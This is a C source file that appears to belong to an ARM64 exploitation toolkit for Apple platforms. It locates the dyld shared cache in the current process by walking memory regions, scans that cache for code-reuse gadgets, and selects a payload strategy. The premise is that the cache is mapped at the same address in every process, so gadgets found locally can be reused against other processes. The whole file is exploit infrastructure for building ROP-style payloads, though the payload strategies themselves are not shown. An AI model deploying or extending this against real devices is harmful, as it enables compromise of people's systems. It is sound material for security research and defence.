#include "arm64_payload.h"

#include "apple_private.h"
#include "arm64/gadgets.h"
#include "log.h"

const struct payload_strategy *strategies[] = {
	&payload_strategy_1,
};

#define STRATEGY_NOT_CHOSEN	((const struct payload_strategy *)1)

// The chosen payload strategy.
static const struct payload_strategy *chosen_strategy = STRATEGY_NOT_CHOSEN;

// Find the dyld shared cache's code segments in our process.
static bool
find_dyld_shared_cache(const void **dyld_shared_cache, size_t *dyld_shared_cache_size) {
	const uint32_t DYLD_SHARED_CACHE_DEPTH = 1;
	const int DYLD_SHARED_CACHE_PROTECTION = VM_PROT_READ | VM_PROT_EXECUTE;
	// First get an address in some cache region.
	mach_vm_address_t begin, end, address = (mach_vm_address_t) malloc;
	mach_vm_size_t size;
	uint32_t depth = DYLD_SHARED_CACHE_DEPTH + 1;
	vm_region_submap_info_data_64_t info;
	mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
	kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &address, &size,
			&depth, (vm_region_recurse_info_t) &info, &count);
	if (kr != KERN_SUCCESS) {
		ERROR("%s: %x", "mach_vm_region_recurse", kr);
		return false;
	}
	if (depth != DYLD_SHARED_CACHE_DEPTH) {
		ERROR("Unexpected dyld shared cache memory protection %x", info.protection);
		return false;
	}
	if (info.protection != DYLD_SHARED_CACHE_PROTECTION) {
		ERROR("Unexpected dyld shared cache memory protection %x", info.protection);
		return false;
	}
	DEBUG_TRACE(3, "DYLD: Initial region %016llx - %016llx", address, address + size);
	// Save the current end address for later.
	end = address + size;
	// Now go backwards until we find a memory region not contained in the dyld shared cache.
	for (;;) {
		begin = address;
		address = begin - 1;
		depth = DYLD_SHARED_CACHE_DEPTH + 1;
		count = VM_REGION_SUBMAP_INFO_COUNT_64;
		kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &address, &size,
				&depth, (vm_region_recurse_info_t) &info, &count);
		if (kr != KERN_SUCCESS
				|| address + size != begin
				|| depth != DYLD_SHARED_CACHE_DEPTH
				|| info.protection != DYLD_SHARED_CACHE_PROTECTION) {
			break;
		}
		DEBUG_TRACE(3, "DYLD: Incorporating region %016llx - %016llx", address,
				address + size);
	}
	// Now go forwards until we find a memory region not contained in the cache.
	for (;;) {
		address = end;
		depth = DYLD_SHARED_CACHE_DEPTH + 1;
		count = VM_REGION_SUBMAP_INFO_COUNT_64;
		kern_return_t kr = mach_vm_region_recurse(mach_task_self(), &address, &size,
				&depth, (vm_region_recurse_info_t) &info, &count);
		if (kr != KERN_SUCCESS
				|| address != end
				|| depth != DYLD_SHARED_CACHE_DEPTH
				|| info.protection != DYLD_SHARED_CACHE_PROTECTION) {
			break;
		}
		DEBUG_TRACE(3, "DYLD: Incorporating region %016llx - %016llx", address,
				address + size);
		end = address + size;
	}
	// Return the region.
	*dyld_shared_cache      = (const void *) begin;
	*dyld_shared_cache_size = end - begin;
	return true;
}

// Find all gadgets in the dyld shared cache's
static void
find_gadgets_in_dyld_shared_cache() {
	const void *dyld_shared_cache;
	size_t dyld_shared_cache_size;
	bool found = find_dyld_shared_cache(&dyld_shared_cache, &dyld_shared_cache_size);
	if (!found) {
		ERROR("Could not locate dyld shared cache");
		return;
	}
	DEBUG_TRACE(2, "dyld shared cache at 0x%llx - 0x%llx",
			(unsigned long long) dyld_shared_cache,
			(unsigned long long) dyld_shared_cache + dyld_shared_cache_size);
	// The dyld shared cache is mapped at the same address in every process, so we can use its
	// address in our process.
	find_gadgets((uint64_t) dyld_shared_cache, dyld_shared_cache, dyld_shared_cache_size);
}

// Choose the payload strategy given the available gadgets.
static void
choose_payload_strategy() {
	for (size_t i = 0; i < sizeof(strategies) / sizeof(strategies[0]); i++) {
		const struct payload_strategy *strategy = strategies[i];
		if (strategy->check_platform()) {
			DEBUG_TRACE(2, "Using payload strategy %zu", i + 1);
			chosen_strategy = strategy;
			return;
		}
	}
	chosen_strategy = NULL;
}

const struct payload_strategy *
arm64_choose_payload(void) {
	if (chosen_strategy == STRATEGY_NOT_CHOSEN) {
		find_gadgets_in_dyld_shared_cache();
		choose_payload_strategy();
	}
	return chosen_strategy;
}
